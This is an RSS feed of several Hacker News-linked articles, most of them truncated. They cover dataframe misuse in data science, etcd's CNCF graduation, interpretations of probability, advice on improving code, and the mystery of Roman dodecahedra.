<p>With <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">OOP</a>, you may have created classes to represent and model the state/behaviour of those entities. With <a href="https://en.wikipedia.org/wiki/Functional_programming">FP</a>, you may have focussed more on the state and the transitions those entities go through.</p>

<p>By <strong>state mismanagement</strong>, we refer to the situation when we don’t create these abstractions.</p>

<h2 id="why-state-management-is-important">
Why state management is important?</h2>

<p>These abstractions are very useful. We can write tests against them. We can use them to debug our code. We can persist them and inspect them later when something goes wrong. These abstractions also make code readable - we can follow the state and transitions of entities to understand what is happening. We can also use the <a href="https://en.wikipedia.org/wiki/Type_system">type of these abstractions</a> to debug/reason about our code <a href="https://en.wikipedia.org/wiki/Strong_and_weak_typing">if it is possible</a>.</p>

<h2 id="state-mismanagement-with-dataframes">
State mismanagement with DataFrames</h2>

<p>DataFrames list all observations of an experiment as rows and attributes of those observations as columns. They are similar to the tables in databases we are used to, but most dataframes in a data science project will typically combine many tables (each table typically represents an entity) into a single object (which will represent/hide states of many entities together).</p>

<p>When we don’t explicitly model different entities, our ability to reason about and debug/inspect them gets diminished significantly. We can’t write tests against functions that do things with those entities and their states. Most of our functions will accept dataframes as input and return dataframes as output, and will typically be in violation of the <a href="https://en.wikipedia.org/wiki/SOLID">SOLID principle</a>.</p>

<p>There are, of course, situations where dataframes are the correct solution. But someone not used to thinking about hidden entities and their states may not use them optimally.</p>

<blockquote>
  <p>The habit of including the states of many entities together in a single dataframe is the most prevalent reason for bad code that we have seen.</p>
</blockquote>

<p>When <a href="https://www.thoughtworks.com/insights/blog/coding-practices-data-scientists">we talk about the poor standard of software engineering</a> in data science, we talk a lot about peripheral issues, but incorrect and <a href="https://medium.com/@karpathy/yes-you-should-understand-backprop-e2f06eab496b">leaky abstractions</a> are the main reason why most of the codebase we have seen suck. If you don’t even model your data adequately, how do you become <a href="http://karpathy.github.io/2019/04/25/recipe/#1-become-one-with-the-data">one with the data</a>?</p>

<p>Models doing well in training and poorly in production, whether due to <a href="https://en.wikipedia.org/wiki/Concept_drift">drift</a> or <a href="https://twitter.com/araffin2/status/1329382226421837825">underspecification</a>, is a <a href="https://arxiv.org/abs/2011.03395">real problem</a>. Without the necessary abstractions in place, it becomes very difficult to monitor, detect, and debug issues when they arise.</p>

<div><p>
If you like what you have read so far, you may consider subscribing to our newsletter.
</p>
</div>



<p>When we say poor abstractions result in poor code, lack of <a href="https://en.wikipedia.org/wiki/SOLID">SOLID</a>-ness is mostly what we mean. A lot of the hacky software engineering practices we have seen in the wild arise as a consequence.</p>

<h2 id="consequences">
Consequences</h2>

<ul>
  <li>
<strong>Deploying models</strong>: The pattern for consuming data in production is different compared to training. Abstractions created to explore/test/validate data in training can be mostly reused in deployment, and the lack of them hurts greatly.</li>
  <li>
<strong>Writing tests</strong>: It is hard to write meaningful tests if models (datastructures) for the entities in data are not available. This is why we are not seeing more tests in ML even though everyone is talking about them.</li>
  <li>
<strong>Monitoring models</strong>: So your credit default model is starting to perform poorly. Is this across the board, or only for a certain segment for certain entities (geocode, user-acquisition-channel cohort, or month)? Hard to answer this quickly in real-time while your deployed models are falling apart (and losing money) if you have not spent the time and effort to model the data and set up appropriate tests/monitoring.</li>
  <li>
<strong>Reproducibility</strong>: Reproducibility can come in many forms. You may be unable to reproduce the older models during monthly updates (data and hyperparameter versioning is another issue entirely), or the same deep learning-based model may produce different embeddings in a cpu-based deployment server when moved from a gpu-based training server. Without correct abstractions to debug with, you’ll be left wondering what is going wrong.</li>
  <li>
<strong>Commenting and reading code</strong>: Poorly written code with a lot of dataframe needs a lot of documentation, and anyone who has worked in a live codebase knows that good comment coverage is a moving goalpost (moving as the code changes).</li>
</ul>

<p>(Note: If you are working with a Python stack, type-annotation is your friend. If you have to use a lot of <em>any</em> or <em>DataFrame</em> types, you are probably doing it wrong. In a correctly architected codebase, type-annotation can completely replace all forms of commenting and still make reading the codebase a breeze.)</p>



<p>As @seanjtaylor said, <em>there are no hard problems, only slow iterations</em>.</p>

<p>If you have an existing codebase that you think suffers from the issues we outline, start by refactoring small chunks of it (larger chunks will mean slower iterations and you’ll learn slower). If you are starting a new codebase, you can identify and model your entities and <a href="http://karpathy.github.io/2019/04/25/recipe/">be one with your data</a> before you start modeling.</p>

<p>And if you already kaggle, don’t stop. Just recognize that the things in Kaggle that give you dopamine hits should not be the same things that give you dopamine hits when you work on a production system. Hack that dopamine!</p>



<p>We are heavily indebted to our colleagues at Difference Engine for the thoughtful conversations and prompts. Particularly, this essay would not have been possible without the insightful …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://databiryani.com/dataframes/machine-learning/data-science/2020/11/28/dataframes-and-the-proliferation-of-bad-code-in-data-science.html">https://databiryani.com/dataframes/machine-learning/data-science/2020/11/28/dataframes-and-the-proliferation-of-bad-code-in-data-science.html</a></em></p>]]>
            </description>
            <link>https://databiryani.com/dataframes/machine-learning/data-science/2020/11/28/dataframes-and-the-proliferation-of-bad-code-in-data-science.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25237677</guid>
            <pubDate>Sat, 28 Nov 2020 14:27:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cloud Native Computing Foundation Announces Etcd Graduation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25237523">thread link</a>) | @talonx
<br/>
November 28, 2020 | https://www.cncf.io/announcements/2020/11/24/cloud-native-computing-foundation-announces-etcd-graduation/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/announcements/2020/11/24/cloud-native-computing-foundation-announces-etcd-graduation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article>
		
						

		<div>
			
<figure><img loading="lazy" width="1024" height="506" src="https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-1024x506.jpg" alt="" srcset="https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-1024x506.jpg 1024w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-300x148.jpg 300w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-768x380.jpg 768w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-1536x759.jpg 1536w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-325x161.jpg 325w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-700x346.jpg 700w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-320x158.jpg 320w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-515x255.jpg 515w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-640x316.jpg 640w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd-1280x633.jpg 1280w, https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Grad_Cards_etcd.jpg 2001w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p><em>Widely used data store solution for orchestrators has seen </em><em>200 distinct contributors in the past 12 months</em></p>



<p><strong>SAN FRANCISCO, Calif. – November 24, 2020 – </strong><a href="https://www.cncf.io/">The Cloud Native Computing Foundation</a>® (CNCF®), which builds sustainable ecosystems for cloud native software, today announced the graduation of etcd. To move from the maturity level of <a href="https://github.com/cncf/toc/blob/master/process/graduation_criteria.adoc">incubation to graduation</a> etcd has demonstrated growing adoption, an open governance process, feature maturity, and a strong commitment to community, sustainability, and inclusivity.</p>



<p><a href="https://etcd.io/">etcd</a> is a distributed, reliable key-value store and provides a reliable way to store data that needs to be accessed by a distributed system or cluster of machines. Applications of any complexity, from a simple web app to Kubernetes, can read data from and write data into etcd. The project was created at CoreOS in 2013 and joined CNCF in December 2018 as an incubating project.&nbsp;</p>



<p>“The etcd project is a key component inside Kubernetes along with many other projects that depend on etcd for reliable distributed data storage,” said Chris Aniszczyk, CTO of the Cloud Native Computing Foundation. “We remain impressed by the milestones that etcd continues to reach in scale and mature handling of its recent security audit, we look forward to cultivating its community as a graduated project.”</p>



<p>etcd is used in production by <a href="https://github.com/etcd-io/etcd/blob/master/ADOPTERS.md">many companies</a>, including Alibaba, Amazon, Baidu, Cisco, EMC, Google, Huawei, IBM, Red Hat, Uber, Verizon, and more, and projects including Kubernetes, CoreDNS, M3, Rook, and TiKV.</p>



<p>“Having etcd as our meta-store in Placement Driver and our inspiration for Raft implementation in production has proven to be a great choice for TiKV and TiDB, ensuring data consistency and high availability across TiDB clusters,” said Ed Huang, co-founder and CTO at PingCAP. “We are proud and glad to be part of its graduation journey, and we’d love to be involved in its ecosystem development more in the future.”</p>



<p>The <a href="https://github.com/etcd-io/etcd/blob/master/MAINTAINERS">maintainer</a> team currently consists of 10 members, with a healthy distribution of corporations represented, including Alibaba, Amazon, Cockroach Labs, Google Cloud, IBM, Indeed, and Red Hat. Three new maintainers have been added since etcd became an incubating project. Over the last 12 months, 200 distinct contributors have authored pull requests.</p>



<p>“After seven years of development, etcd has reached maturity and become the cornerstone of many distributed systems. The most important decision for its success was joining the CNCF community and growing its maintainers across many organizations,” said Xiang, etcd maintainer, CNCT TOC member, and engineering director at Alibaba Cloud. “We are excited to see its graduation at CNCF. etcd is the centerpiece powering the container service and many other critical services at Alibaba Cloud. We are looking forward to improving its stability, reliability, and performance with the community in the future.”</p>



<p>A third-party <a href="https://www.cncf.io/blog/2020/08/05/etcd-security-audit/">security audit</a> sponsored by CNCF was performed in July 2020 for the latest major release of etcd, v3.4 by Trail of Bits. According to the <a href="https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf">report</a>, the etcd codebase represents a mature and heavily adopted product, and there were no significant issues found in the core components of etcd. One high severity issue was found in the etcd gateway, which the team addressed with fixes and backported into etcd supported releases.&nbsp;</p>



<p>The project also went through Jepsen testing, which analyzes open source distributed systems to check if they fulfill their consistency guarantees, in January 2020. The <a href="https://etcd.io/blog/jepsen-343-results/">results</a> showed maturity in the project functionality. The Jepsen team also pointed out a few areas for improvements, which were implemented by the etcd team.&nbsp;</p>



<p>“From the beginning, etcd was designed to ease consensus store operations, making it attractive for use with container orchestration systems like Kubernetes. etcd’s selection as the control plane storage for Kubernetes proved a great fit, and two projects have grown and matured together,” said Joe Betz, etcd maintainer and software engineer at Google Cloud. “We are excited to see etcd’s dedication toward reliability, scalability, and quality recognized by the CNCF with this graduation. Today’s announcement is a testament to the maturity of etcd and its readiness for production workloads.”&nbsp;</p>



<p>“Today’s major milestone of the graduation of etcd, could not have been accomplished without the work of the community and the support from the CNCF,” said Sahdev Zala, senior software engineer, open technology, IBM and etcd maintainer. “etcd is playing a critical role providing a distributed key-value store that is highly available and meets the strong consistency requirements demanded by large scale Kubernetes clusters.”</p>



<p>“Open source software powers our lives in so many ways,” said Bob Wise, General Manager of Kubernetes at AWS. “From Linux to Kubernetes, open communities of builders from all sizes of organizations and walks of life spend considerable time creating and maintaining projects that underpin much of the internet, telecommunications, finance, transportation, gaming, retail, and healthcare systems we use every day.&nbsp; etcd is one of these critical projects, and we’re proud to have etcd as a core part of Amazon EKS and to be involved in helping the project grow and thrive. We are fervent supporters of etcd’s graduation and look forward to collaborating with etcd and other CNCF projects to build secure, reliable, powerful, and scalable open source software.”</p>



<p>To officially graduate from incubating status, the project was certified for <a href="https://bestpractices.coreinfrastructure.org/en/projects/3192">CII Best Practices Badge</a>, completed security audits and addressed vulnerabilities, defined its own <a href="https://github.com/etcd-io/etcd/blob/master/GOVERNANCE.md">governance</a>, and adopted the <a href="https://github.com/etcd-io/etcd/blob/master/code-of-conduct.md">CNCF Code of Conduct</a>.</p>



<p><strong>etcd Background</strong></p>



<p>etcd is a distributed, reliable key-value store for the most critical data of a distributed system, with a focus on being:</p>



<ul><li>Simple: well-defined, user-facing API (gRPC)</li><li>Secure: automatic TLS with optional client cert authentication</li><li>Fast: benchmarked 10,000 writes/sec</li><li>Reliable: properly distributed using Raft</li></ul>



<p>To learn more about etcd, visit <a href="https://etcd.io/">etcd.io</a>.&nbsp;</p>



<p><strong>Additional Resources</strong></p>



<ul><li><a href="https://www.cncf.io/newsroom/newsletter/">CNCF Newsletter</a></li><li><a href="https://twitter.com/cloudnativefdn/">CNCF Twitter</a></li><li><a href="https://cncf.io/">CNCF Website</a></li><li><a href="https://cncf.io/join">Learn About CNCF Membership</a></li><li><a href="http://www.cncf.io/people/end-user-community.">Learn About the CNCF End User Community</a></li></ul>



<p><strong>About Cloud Native Computing Foundation</strong></p>



<p>Cloud native computing empowers organizations to build and run scalable applications with an open source software stack in public, private, and hybrid clouds. The Cloud Native Computing Foundation (CNCF) hosts critical components of the global technology infrastructure, including Kubernetes, Prometheus, and Envoy. CNCF brings together the industry’s top developers, end users, and vendors, and runs the largest open source developer conferences in the world. Supported by more than 500 members, including the world’s largest cloud computing and software companies, as well as over 200 innovative startups, CNCF is part of the nonprofit Linux Foundation. For more information, please visit www.cncf.io.</p>



<p><em>###</em></p>



<p><em>The Linux Foundation has registered trademarks and uses trademarks. For a list of trademarks of The Linux Foundation, please see our trademark usage page. Linux is a registered trademark of Linus Torvalds.</em></p>



<p><strong>Media Contact</strong></p>



<p>Katie Meinders</p>



<p>The Linux Foundation</p>



<p><a href="mailto:PR@CNCF.io">PR@CNCF.io</a></p>


			<hr>
			
		</div>
				</article>
</div></div>]]>
            </description>
            <link>https://www.cncf.io/announcements/2020/11/24/cloud-native-computing-foundation-announces-etcd-graduation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25237523</guid>
            <pubDate>Sat, 28 Nov 2020 13:56:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Probability Real?]]>
            </title>
            <description>
<![CDATA[
Score 192 | Comments 168 (<a href="https://news.ycombinator.com/item?id=25237356">thread link</a>) | @EbTech
<br/>
November 28, 2020 | https://www.arameb.com/blog/2020/11/22/probability | <a href="https://web.archive.org/web/*/https://www.arameb.com/blog/2020/11/22/probability">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Today, I want to address an issue with statements involving chance. To demonstrate, let’s first consider a statement that doesn’t involve chance:</p>

<p>“<em>A cubic die tossed onto a flat surface will come to rest on one of its six sides.</em>”</p>

<p>This claim can be empirically tested, with various dice and surfaces. If any one of our experiments results in the die spinning endlessly on a corner, we will have disproven the claim. We may have to refine the claim’s conditions; for instance, by requiring the presence of gravity. Nonetheless, it’s fairly clear what it means for the statement to be true or false. Now let’s try to make a claim involving probability:</p>

<p>“<em>If a pair of standard dice are thrown, the probability of their face-up sides summing to nine will be one in nine (about 0.11 or 11%).</em>”</p>

<p>What does it mean for this statement to be true? Unlike the first statement, this one doesn’t specify which result we’ll actually see. How can we possibly hope to test it, or to make use of its information?</p>



<p>Within the realm of abstract mathematics, we’re free to model probability in a way that fits our intuitions. Imagine a multiverse containing an infinity of possible worlds, whose total <em>measure</em> is 100%. Define the probability of an <em>event</em>, such as that of rolling a nine, to be the measure assigned to the subset of worlds in which the event actually occurs.</p>

<p>In the abstract formalism, we’re allowed to assign the measure however we like, subject to Kolmogorov’s axioms: the measure must be non-negative, countably additive, and total to 100%. By respecting the symmetry of an idealized die,<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> we might argue that only one such assignment makes sense; from it, we can calculate the probability of any event involving dice rolls.</p>

<p>There are two shortcomings to this approach. Firstly, we won’t always deal with nicely symmetrical objects for which direct a priori arguments are possible. Thus, we still need a means of testing probabilistic claims using real-life observations. Secondly, such arguments can never be airtight: after all, how can we hope to infer the measure on a hypothetical multiverse, when we only ever experience <em>one</em> world? Indeed, a realist might question if it makes any sense to discuss the chances of an event happening: either it happens or it doesn’t!</p>



<p>You might be more trusting of someone who puts their money where their mouth is. To back up a definite claim, not involving chance, I can simply agree to pay a penalty if it turns out I’m wrong.</p>

<p>This idea can be extended to probabilistic claims in the following manner: consider a lottery that pays a $90 jackpot if the next roll of a pair of dice yields a nine. If the maximum that I’m willing to pay to play is $10, this indicates that I believe a not-nine roll is eight times more likely than a nine roll. This approach is appealing because, after all, the <em>raison d’être</em> of probability theory is to explain the decision-making of individuals facing uncertainty.</p>

<p>If another gambler’s view conflicts with mine, you may aggregate our beliefs by creating a market on which we buy and sell predictions. Consider a contract that pays $100 (plus interest) when a specified event occurs. Its price on the market can be interpreted as the percentage probability of that event. Thus, to say an event is twice as “likely” as another, simply means its market price is double.</p>

<p>Unlike your typical gambler, a frictionless market offers transparent near-identical buy and sell prices. As a result, any violations of Kolmogorov’s axioms become money-making arbitrage opportunities. Arbitrage activity acts as an enforcer of the axioms, creating what economists call the <em>risk-neutral probability measure</em>.</p>

<p>In real markets, however, this probability measure exhibits several inconsistenties. Firstly, it depends on which currency is used: as an extreme example, we wouldn’t buy a dollar-denominated wager that only pays out if the dollar collapses, no matter how likely we imagine the collapse to be. Secondly, this measure is sensitive to (non-diversifiable) risk: if a widely-believed prophecy held that rolling a nine would induce a catastrophic famine, the market would value this outcome a lot more, because everyone wants to buy insurance against such a catastrophe. Thirdly, markets can be misinformed: indeed, one motivation for participating in a market is to try to beat it! And finally, liquid markets are hard to set up.</p>

<p>For these reasons, we abandon this approach. We’ll seek to define probability in terms of actual outcomes instead of human bets. Nonetheless, human bets are what inspired the creation of probability theory: it’s hard to think of any other practical application! Therefore, we should remember to revisit the matter once we’ve found an appealing probability concept. Ultimately, we must be able to explain <em>how</em> individuals and markets behave with respect to our concept, and answer <em>why</em> they should care about it at all.</p>

<p>These questions are incredibly subtle: the theory of evolution by natural selection tells us that individuals are wired to use strategies that enabled their ancestors’ survival; however, the nature of probabilistic beliefs is that a wide range of outcomes are plausible. Indeed, while a coin will always land heads or tails, it’s considered unwise to bet your life savings on either heads or tails. Intuitively speaking, the rationale is that you’re almost certain to lose <em>eventually</em>, if you keep playing this way. This idea of repeated trials inspires our next interpretation, which happens to be the most popular among scientists.</p>



<p>According to the frequentist school of thought, a probabilistic statement is not to be taken literally. Although it refers to a single event, the statement should be taken as shorthand for a claim involving a very large collection of similar events. Imagine rolling the dice over and over. The probabilistic claim that we started with is converted into the following:</p>

<p>“<em>If a pair of standard dice are thrown repeatedly, then in the limit as the number of throws goes to infinity, the proportion of nines converges to one in nine (about 0.11 or 11%).</em>”</p>

<p>The short-run probability is replaced by a long-run proportion. Given an infinite sequence of rolls, this statement unambiguously reveals itself to be true or false. In light of the frequentist interpretation, we can even make more sense of our earlier interpretations. While we only experience one world, repeating an experiment under similar conditions is like observing the experiment in a parallel universe: whether we count trials or worlds, the math is virtually identical. In the limit of infinitely many bets, we can make some unambiguous conclusions about the quality of a gambler’s strategy, too: this is how casinos ensure that the house always wins!</p>

<p>Testing our claim is a simple matter: we roll the dice, over and over, and over and over… infinity times. Oops. Of course, there is no such thing as an experiment with infinity trials. Our arms will get tired, the dice will wear out, the Sun will explode, and all the free energy in the universe will be consumed. At best, we can do a very large number of trials. Let’s say we roll dice 9,000 times; one in nine of these would be 1,000. Perhaps we won’t roll exactly 1,000 nines, so let’s interpret our claim with a suitable margin of error, called a <em>confidence interval</em>:</p>

<p>“<em>If a pair of standard dice are thrown 9,000 times, then the face-up sides will sum to nine for between 920 and 1,080 of the throws.</em>”</p>

<p>The probability of obtaining between 920 and 1,080 nines can be calculated to be 99.3%.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Thus, we’ve turned a probabilitic statement into a much more certain but still probabilistic statement. If we observe 1,100 nines, we should be able to dismiss the probabilistic claim as false. And yet, if every household on Earth were to independently perform this 9,000-throw experiment, we should expect that a great many of their results would fall outside the confidence interval. They would disagree on the truth of our statement!</p>

<p>There’s no getting around it: despite its intuitive appeal, the frequentist definition of probability is circular, reducing probability claims to probability claims.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> To end the cycle, the frequentist chooses a threshold (say, 99%) beyond which to treat events as objective truths. This grants the claim an empirically observable meaning. And yet, the frequentist must take care not to consider too many such events, for otherwise the probability of <em>at least one</em> of the events failing may ALSO exceed the threshold of certainty: a logical contradiction.</p>

<p>Things only work out nicely in the limit of infinite sample size. Statisticians mainly deal with experiments which can be repeated so many times that, for most practical purposes, their conclusions can be treated as definite. Non-philosophers are usually happy to ignore a sub-1% chance of error; and if that’s not good enough, make it 0.0001%! Confidence can be increased by gathering more data, i.e., increasing the sample size.</p>

<p>This approach turns out to be very powerful. By designing more complex hypotheses in which probabilities vary as a function of context variables, even some phenomena that aren’t easily repeatable can be statistically analyzed. For example, weather forecasts are based on well-tested models that use measurements of variables such as temperature, pressure, humidity, and wind.</p>

<p>On the other hand, statistical models of sports games, democratic elections, or company stocks tend to be less testable: the interactions are very complex and there are too few outcomes from which to extrapolate. Similarly, when you try to predict which colleges will admit you or which of your friends will start a business, you don’t make your case using repeatable tests. Clearly, the frequentist interpretation cannot apply. One may argue that no conclusions in these cases would hold up to a scientific standard; nonetheless, if we seek a theory of decision-making under uncertainty, there’s no …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.arameb.com/blog/2020/11/22/probability">https://www.arameb.com/blog/2020/11/22/probability</a></em></p>]]>
            </description>
            <link>https://www.arameb.com/blog/2020/11/22/probability</link>
            <guid isPermaLink="false">hacker-news-small-sites-25237356</guid>
            <pubDate>Sat, 28 Nov 2020 13:23:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Always leave the code better than you found it]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25237341">thread link</a>) | @hans1729
<br/>
November 28, 2020 | https://letterstoanewdeveloper.com/2020/11/23/always-leave-the-code-better-than-you-found-it/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2020/11/23/always-leave-the-code-better-than-you-found-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Dear new developer,</p>



<p>I’ve spent a lot of my time maintaining working code. I think that is more typical of software developers than working in greenfield development. Yes, there are definitely jobs where you are writing more new code than maintaining, upgrading, bug fixing and improving old code (startups without product market fit being one, consulting being another) but in general code is expensive and folks want to run it for a long time. </p>



<p>Often you’ll jump into code to fix a bug, investigate an issue or answer a question.</p>



<p>When you do so, improve it. This doesn’t mean you rewrite it, or upgrade all the libraries it depends on, or rename all the variables. </p>



<p>You don’t need to transform it. </p>



<p>But you should make it better. Just clean it up a bit. Doing so makes everyone’s lives just a bit better, helps the codebase in a sustainable way, and assists the business by making its supporting infrastructure more flexible.</p>



<p>What are some ways to improve the code when you are in it?</p>



<p><strong>Document</strong></p>



<p>Whether that is a comment that explains something tricky, a larger piece of documentation external to the code which explains how to interact with it, or fixing a typo, trustworthy documentation is key to interacting with code. This is a good way to start improving a codebase because it has minimal impact on the actual code. Therefore it is low risk. But if you’ve ever had a great comment explain a confusing bit of code, you’ll appreciate the time this effort can save.</p>



<p>You can also help documentation by removing old, crufty docs. If you see a comment that doesn’t apply, remove it. If there’s cut and paste documentation which doesn’t apply, get rid of it. That cleans up the code for the next person to come along (who might be you).</p>



<p><strong>Write a test or improve a test</strong> </p>



<p>Tests help you write maintainable, extensible code that others can change fearlessly. If you run across code that isn’t tested and you have time and the supporting framework to write one, do so. </p>



<p>Even if it tests simple functionality such as “can I instantiate this object” or “how does this function react when I pass it two null values”, an additional test will help the robustness of the code. </p>



<p><strong>Refactor it</strong></p>



<p>This is one of the most flexible improvements. Refactoring code can range from renaming a variable to be more true to its nature to an overhaul of an entire module. Start small and don’t get wrapped up in perfection. Make the code clearer in intent. </p>



<p>It’s easy with refactoring to get wound around an axle and make too many changes and end up with broken things. Timeboxing is one technique I use to avoid, or at least minimize, my tendencies toward this when refactoring. If all I have is 30 minutes, I’ll make my changes smaller in scope.</p>



<p>A warning about refactoring. Don’t refactor what you don’t understand. Don’t drive by refactor. Discuss your plan with someone more familiar with the code; <code>git blame</code> is your friend. Especially if the code is not well tested, you want to make sure you don’t do more harm than good.</p>



<p><strong>Upgrade a dependency</strong></p>



<p>It’s sometimes a winding path, but upgrading your dependencies regularly is a good way to maintain the code. I remember working in a fork of struts. It was an important application for the company, but we didn’t spend the time upgrading the dependencies, because it was too painful. Eventually, parts of the code became harder to update. The entire application couldn’t benefit from newer technologies and paradigms because of the older dependencies holding it back. </p>



<p>It never feels good to spend time updating a dependency; to me this always feels like running in place. But if you don’t do so, eventually dependencies will end of life and you’ll be forced to update. That’ll be even less pleasant. </p>



<p><strong>How to do it</strong></p>



<p><em>Based on feedback (<a href="https://www.reddit.com/r/programming/comments/k2cbtb/always_leave_the_code_better_than_you_found_it/gdv0kg9/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">this comment</a>, among others), I added this section on Nov 28.</em></p>



<p>When you are making these changes to improve the code, you’ll help out code reviewers and your future self by making changes that are improving the code separate from changes that add functionality. Whether you do this in separate pull requests, tickets, or commits depends on your team culture. Ask about that. But such separation will make it easier for people who aren’t familiar with the changes to understand them and give feedback on them, whether that is a code review this week or someone reviewing this component two years from now.</p>



<p><strong>Why do it</strong></p>



<p>All of these actions not only help others because they improve the quality of the code, they also provide examples to other developers on how to do so. For example, it is far easier to write the second test in a suite than the first. You can cut and paste a lot of the setup code and tweak only what is different. The first bit of documentation will inspire more.</p>



<p>Code isn’t everything, but it is an important work output. Whenever you touch it, you should strive to leave it in a better place that it was before you did so.</p>



<p>Sincerely,</p>



<p>Dan</p>
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2020/11/23/always-leave-the-code-better-than-you-found-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25237341</guid>
            <pubDate>Sat, 28 Nov 2020 13:19:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Grep.app, a GitHub code search engine to search for code patterns and examples]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25237338">thread link</a>) | @hackerpain
<br/>
November 28, 2020 | https://grep.app/search?q=pattern | <a href="https://web.archive.org/web/*/https://grep.app/search?q=pattern">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://grep.app/search?q=pattern</link>
            <guid isPermaLink="false">hacker-news-small-sites-25237338</guid>
            <pubDate>Sat, 28 Nov 2020 13:19:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What were these Roman objects used for?]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25237271">thread link</a>) | @jd115
<br/>
November 28, 2020 | http://www.celticnz.co.nz/Dodecahedron/Decoding%20the%20Druidic%20Dodecahedron1.html | <a href="https://web.archive.org/web/*/http://www.celticnz.co.nz/Dodecahedron/Decoding%20the%20Druidic%20Dodecahedron1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<p><strong>DECODING THE DRUIDIC DODECAHEDRON </strong></p>

<p><img src="http://www.celticnz.co.nz/OrgImages/Dodecahedron/Dodecahedron%20Types.jpg" width="900" height="438"></p>
<p><strong>These bronze artefacts are so-called <em>Roman</em> dodecahedra (plural of dodecahedron)  of which about 120 have been found in the Celtic countries of Europe. Strangely, none of these have been found in Italy, home turf of the Romans.</strong> <strong>To the left is seen a dodecahedron from the Römermuseum Schwarzenacker, Homburg, Germany collection. To the right is seen another pristine example from the Hunt Museum in Limerick Ireland </strong></p>

<p><img src="http://www.celticnz.co.nz/OrgImages/Dodecahedron/Dodecahedron%20Types3.jpg" width="935" height="438"></p>
<p><strong>To the left is a dodecahedron from Archaeological  Service Canton Aargau, Brugg, Switzerland (Vindonissa Museum). To the right is a dodecahedron from the Gallo-Roman Museum, Tongeren, Belgium. </strong></p>
<p>The basic design of these artefacts remains relatively constant (12 pentagonal faces with knop-shaped legs), however, there can be a range of different  incised designs in the layout of the faces<strong>. </strong></p>
<p>The actual function of these artefacts cannot be explained by our historians or archaeologists, although many theories abound,  none of which seem particularly convincing. Also, there is no  mention of these items in old historical records of the Romans or those of anyone else for that matter. They are such an enigma that academics have pretty-much come to the defeatist conclusion that <em><strong>"we will never know what these dodecahedrons were used for". </strong></em></p>
<p>In reviewing the academic literature, one begins to see why the mystery will probably never be solved within that community. Here are some of the impediments and pitfalls our experts create for themselves:</p>
<p>All archaeological measurements are given in metric increments (centimetres or millimetres), which is a modern system that was created as much as 2000-years after some of these dodecahedra were cast in bronze. Earlier exemplars in stone or wood could predate the latter, more refined ones, by yet another thousand years or more. This  metric measurement preoccupation renders the  encoded numbers invisible or unrecognisable. Our academics know a large swathe of the ancient measurements that were in use two thousand years ago or before, so why not apply them to this study? </p>
<p>Most assuredly, the various sized holes in the 12-faces, the concentric circles that circumnavigate them, as well as the additional incised lines or dotted circles, etc, infer that there is something vividly measurable going on and it's evident that each hole or ring  has been very purposely fabricated to represent a known, precise and sought-after measurement.</p>
<p><img src="http://www.celticnz.co.nz/OrgImages/Dodecahedron/Calibrated.jpg" width="900" height="476"> </p>
<p><strong>A number of dodecahedra have calibration marks along their edges or around the holes in their faces. To the left is seen a calibrated dodecahedron from Hereford Museum, Kenchester and to the right is seen another from Goodrich Castle. Yet another one found in Wales shows etched calibration marks. </strong></p>
